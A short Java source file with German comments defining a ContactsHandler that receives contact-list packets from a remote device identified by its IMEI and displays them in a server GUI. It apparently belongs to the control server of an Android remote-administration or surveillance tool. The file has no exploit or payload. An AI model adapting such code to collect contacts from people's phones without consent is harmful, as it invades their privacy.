package handler;

import server.Server;
import Packet.ContactsPacket;
import Packet.Packet;
import gui.GUI;

/**
 * Diese Klasse verarbeitet die Kontaktpakete.
 */
public class ContactsHandler implements PacketHandler {
	/**
	 * gui Die Benutzeroberfläche
	 */
	private GUI gui;
	/**
	 * channel Der Datenkanal
	 */
	private int channel;
	/**
	 * imei Die IMEI des verbundenen Gerätes
	 */
	private String imei;

	/**
	 * Der Konstruktor der Klasse weißt die übergebenen Daten den Klassenvariablen zu.
	 * @param chan	Der Datenkanal
	 * @param imei	Die IMEI
	 * @param gui	 Die Benutzeroberfläche
	 */
	public ContactsHandler(int chan, String imei, GUI gui) {
		channel = chan;
		this.imei = imei;
		this.gui = gui;
	}

	@Override
	public void receive(Packet p, String imei) {
		// TODO Auto-generated method stub
	}

	/**
	 * Diese Methode wird einen Lognachricht erstellen, die auf der Gui angezeigt wird.
	 * Zusätzlich wird der Listener für den Datenkanal entfertn und die Daten der updateContacts Methode übergeben.
	 * Dadurch werden die Daten auf der GUi angezeigt.
	 * @param p	Das Paket
	 * @param temp_imei	Eine IMEI
	 * @param c	Der Server
	 */
	@Override
	public void handlePacket(Packet p, String temp_imei, Server c) {
		gui.logTxt("Contacts data has been received");
		c.getChannelHandlerMap().get(imei).removeListener(channel);
		ContactsPacket packet = (ContactsPacket) p;
		gui.updateContacts(imei, packet.getList());
	}
}
